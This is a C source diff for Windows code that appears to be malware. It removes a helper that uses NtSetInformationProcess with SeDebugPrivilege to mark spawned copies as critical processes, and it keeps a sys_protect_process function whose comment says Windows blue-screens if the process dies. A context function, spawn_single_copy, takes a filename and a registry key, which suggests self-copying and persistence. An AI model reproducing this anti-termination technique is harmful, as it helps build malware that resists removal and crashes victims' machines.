@@ -244,19 +244,8 @@ static int enable_privilege(const char *privilege_name) {
     return 1;
 }
 
-/* Mark any process as critical by handle. Requires SeDebugPrivilege. */
-static void protect_process_handle(HANDLE hProc) {
-    typedef NTSTATUS (WINAPI *NtSetInfoProc)(HANDLE, INT, PVOID, ULONG);
-    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
-    if (!ntdll) return;
-    NtSetInfoProc pNtSetInformationProcess = (NtSetInfoProc)GetProcAddress(ntdll, "NtSetInformationProcess");
-    if (!pNtSetInformationProcess) return;
-    enable_privilege("SeDebugPrivilege");
-    ULONG isCritical = 1;
-    pNtSetInformationProcess(hProc, 29, &isCritical, sizeof(isCritical));
-}
-
-/* Mark current process as critical */
+/* Mark process as critical — Windows BSODs if this process dies.
+   Requires SeDebugPrivilege. */
 void sys_protect_process(void) {
     typedef NTSTATUS (WINAPI *NtSetInfoProc)(HANDLE, INT, PVOID, ULONG);
     
@@ -431,8 +420,6 @@ static void spawn_single_copy(const char *filename, const char *regKey) {
                        NULL, NULL, &si, &pi);
 
     if (created) {
-        /* Elevate spawned copy to critical immediately */
-        protect_process_handle(pi.hProcess);
         CloseHandle(pi.hProcess);
         CloseHandle(pi.hThread);
     } else {
